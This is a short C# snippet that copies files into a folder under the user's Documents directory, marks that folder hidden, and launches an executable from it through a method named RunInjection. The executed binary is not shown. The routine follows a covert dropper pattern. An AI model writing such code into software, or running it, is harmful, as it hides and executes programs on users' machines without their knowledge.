private void StartHumanInstrumentalityProject(){
    System.Diagnostics.Process.Start(@"C:\Users\" + userName + "\\Documents\\Eva\\EvaShogoki.exe");
}

private void CopyEvaShogoki(){
    string fileName = "Eva";
    string sourcePath = Application.StartupPath + "\\Eva";
    string targetPath = @"C:\Users\" + userName + "\\Documents";

    string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
    string destFile = System.IO.Path.Combine(targetPath, fileName);

    System.IO.Directory.CreateDirectory(targetPath + "\\Eva");

    File.SetAttributes(targetPath + "\\Eva", FileAttributes.Hidden);

    if (System.IO.Directory.Exists(sourcePath))
    {
        string[] files = System.IO.Directory.GetFiles(sourcePath);

        // Copy the files and overwrite destination files if they already exist.
        foreach (string s in files)
        {
            // Use static Path methods to extract only the file name from the path.
            fileName = System.IO.Path.GetFileName(s);
            destFile = System.IO.Path.Combine(targetPath + "\\Eva", fileName);
            System.IO.File.Copy(s, destFile, true);
        }
    }
}

private void RunInjection() {
  CopyEvaShogoki();
  StartHumanInstrumentalityProject();
}